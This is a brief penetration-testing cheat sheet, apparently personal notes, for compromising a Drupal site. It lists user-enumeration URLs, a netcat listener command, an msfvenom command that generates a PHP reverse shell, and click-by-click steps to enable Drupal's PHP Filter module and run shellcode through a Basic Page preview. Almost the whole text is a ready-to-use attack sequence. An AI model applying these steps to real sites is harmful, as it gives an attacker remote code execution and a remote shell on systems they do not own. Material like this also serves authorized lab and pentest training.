### user enum
```
<domain>/user/register
```

### get number of existing user
```
/users/<number>
```

### start listener
```
nc -lvp <lport>
```

### create php reverse shell
```
msfvenom -p php/reverse_php lhost=<lhost> lport=<lport> -f raw
```

### insert PHP code into Drupal
```
/modules/php
Modules > (Check) PHP Filter > Save configuration
Modules > PHP filter Permsissions > Check Use th PHP code text format for Administrator > Save permissions
Content > Add content > Basic Page > Write php shellcode on the body > Text format: PHP code > Preview
```

